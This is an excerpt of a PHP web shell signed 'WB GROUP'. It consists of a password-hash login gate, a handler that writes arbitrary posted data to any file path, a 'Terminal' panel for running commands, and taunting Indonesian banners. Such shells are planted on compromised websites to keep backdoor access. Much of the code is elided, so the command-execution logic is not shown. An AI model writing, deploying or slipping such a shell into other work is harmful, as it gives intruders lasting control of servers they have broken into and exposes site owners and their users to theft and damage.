...
$__pass_hash__ = '$2a$12$cCCuCfjSjFfCdQ.GIjernecxcgJ7m4IPevh0sHY5Gbg3fXzIZHacy';
$__auth__ = false;
...
if (isset($_POST['__create__'])) {
    ...
    if ($__type__ === 'file') {
        if (file_put_contents($__path__, $_POST['__data__'] ?? '')) {
            echo '<div style="background:rgba(0,0,0,0.8);color:lime;padding:10px;margin:10px;border-radius:5px;border-left:4px solid lime;">✅ File created: ' . $__name__ . '</div>';} else {
        ...
        * {
        ...
        body {
            ...
            background: linear-gradient(rgba(0,0,0,0.1), rgba(0,0,0,0.2)), 
                        url('https://i.ibb.co/BHGzb0yf/2d9fe1c7-f4a7-4574-89b4-ee8c2a1d6f80.png') no-repeat center center fixed;
...
<body>
    <div class="container">
        <!-- HEADER -->
        <div class="header">
            <h1 style="font-size: 18px; margin-bottom: 5px;">KASIH PAHAM🔫</h1> <span style="color:gold;">AMPUNNN PUH</span></h3>
        ...
        <div class="terminal" id="terminal">
            <h3 style="margin-bottom: 8px; font-size: 14px;">💥 Terminal 💥</h3>
        ...
        <!-- FOOTER -->
        <div class="footer">
            🔫 WB GROUP | <?php echo date('Y-m-d H:i:s'); ?> | PHP <?php echo PHP_VERSION; ?>
            <br>
            <small style="color:#39FF14; font-size: 10px;">MOVE IN SILENCE, WIN WITH IMPACT</small>
        </div>
    </div>
